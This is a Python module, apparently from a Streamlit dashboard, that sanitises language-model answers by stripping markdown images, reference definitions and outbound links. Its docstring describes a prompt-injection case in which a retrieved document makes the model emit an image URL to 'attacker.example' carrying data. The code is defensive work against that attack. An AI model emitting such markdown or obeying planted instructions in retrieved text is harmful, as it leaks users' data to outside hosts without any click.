"""Rendering model text safely in the dashboard.

The answer comes from a language model, and a planted instruction in a retrieved document could make it emit
markdown the browser acts on: an image ("![](https://attacker.example/?q=...)") is fetched as soon as it is
rendered, which leaks data without a click. So images are removed and outbound links become plain text.
Raw HTML is never rendered (Streamlit escapes it unless unsafe_allow_html=True, which this dashboard never sets).
"""
import re

_IMAGE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
_LINK = re.compile(r"\[([^\]]+)\]\((?!#)[^)]*\)")
_CITATION = re.compile(r"\[(\d+)\]")
# Reference-style images ("![x][ref]" + a "[ref]: https://..." line) are fetched just like inline ones. Only the
# IMAGE form is stripped: plain "[text][ref]" has the same shape as back-to-back citations "[1][2]", and once the
# definitions are gone an undefined reference renders as harmless text.
_REFERENCE_DEF = re.compile(r"^[ \t]{0,3}\[[^\]]+\]:[ \t]*\S+.*$", re.MULTILINE)
_REFERENCE_USE = re.compile(r"!\[([^\]]*)\]\[[^\]]*\]")


def safe_markdown(text: str, anchor_prefix: str) -> str:
    """Model text made safe to render: no images, no outbound links; citations [n] become in-page links."""
    text = _REFERENCE_DEF.sub("", text)
    text = _REFERENCE_USE.sub(lambda m: m.group(1), text)
    text = _IMAGE.sub(lambda m: f"[image removed: {m.group(1) or 'no description'}]", text)
    text = _LINK.sub(lambda m: m.group(1), text)
    return _CITATION.sub(lambda m: f"[\\[{m.group(1)}\\]](#{anchor_prefix}source-{m.group(1)})", text)


